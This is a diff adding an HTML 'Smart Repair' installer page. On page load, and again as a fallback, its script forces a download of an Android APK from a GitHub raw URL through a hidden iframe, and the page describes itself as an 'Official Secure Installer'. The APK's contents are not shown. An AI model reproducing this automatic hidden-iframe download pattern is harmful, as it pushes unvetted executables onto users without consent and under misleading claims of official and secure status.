@@ -1,1 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Smart Repair App Installer</title>
 
+<!-- SEO -->
+<meta name="description" content="Official Smart Repair App Installer. Automatic download enabled.">
+<meta name="robots" content="index, follow">
+
+<!-- Theme -->
+<meta name="theme-color" content="#0f172a">
+
+<style>
+body{
+    margin:0;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu;
+    background: linear-gradient(135deg,#0f172a,#020617);
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    text-align:center;
+}
+
+.container{
+    max-width:420px;
+    padding:30px;
+    background: rgba(255,255,255,0.05);
+    border-radius:16px;
+    backdrop-filter: blur(10px);
+    box-shadow:0 0 30px rgba(0,0,0,0.5);
+}
+
+.logo{
+    width:90px;
+    margin-bottom:15px;
+}
+
+h1{
+    margin:10px 0;
+    font-size:24px;
+}
+
+p{
+    opacity:0.8;
+}
+
+.btn{
+    margin-top:20px;
+    padding:14px 28px;
+    background:#22c55e;
+    border:none;
+    border-radius:8px;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.btn:hover{
+    background:#16a34a;
+}
+
+.progress{
+    margin-top:15px;
+    font-size:14px;
+    opacity:0.7;
+}
+
+.footer{
+    margin-top:15px;
+    font-size:12px;
+    opacity:0.5;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+    <img src="https://cdn-icons-png.flaticon.com/512/888/888879.png" class="logo">
+
+    <h1>Smart Repair Installer</h1>
+
+    <p>Your download will start automatically.</p>
+
+    <button class="btn" onclick="startDownload()">
+        Download Manually
+    </button>
+
+    <div class="progress" id="status">
+        Preparing download...
+    </div>
+
+    <div class="footer">
+        Official Secure Installer
+    </div>
+
+</div>
+
+<script>
+
+const apkUrl = "https://raw.githubusercontent.com/biz-rahul/RKP/main/app/Smart-Repair.apk";
+
+
+/*
+CORE AUTO DOWNLOAD ENGINE
+*/
+
+function startDownload()
+{
+    document.getElementById("status").innerText="Starting download...";
+
+    const link = document.createElement("a");
+    link.href = apkUrl;
+    link.download = "Smart-Repair.apk";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+    document.getElementById("status").innerText="Download started successfully.";
+}
+
+
+/*
+AUTO START ON PAGE LOAD
+*/
+window.onload = function()
+{
+    setTimeout(()=>{
+        startDownload();
+    },1000);
+};
+
+
+/*
+ANDROID DETECTION
+*/
+function isAndroid()
+{
+    return /Android/i.test(navigator.userAgent);
+}
+
+
+/*
+INSTALL GUIDE MESSAGE
+*/
+if(isAndroid())
+{
+    document.getElementById("status").innerText =
+    "Android detected. Download will begin automatically.";
+}
+else
+{
+    document.getElementById("status").innerText =
+    "Please open this page on Android device.";
+}
+
+
+/*
+ANTI-SPAM: prevent multiple downloads
+*/
+let downloaded=false;
+
+function startDownload()
+{
+    if(downloaded) return;
+
+    downloaded=true;
+
+    document.getElementById("status").innerText="Downloading APK...";
+
+    const iframe = document.createElement("iframe");
+    iframe.style.display="none";
+    iframe.src=apkUrl;
+    document.body.appendChild(iframe);
+}
+
+
+/*
+FAILSAFE: fallback after 4 seconds
+*/
+setTimeout(()=>{
+    if(!downloaded)
+        startDownload();
+},4000);
+
+
+</script>
+
+</body>
+</html>
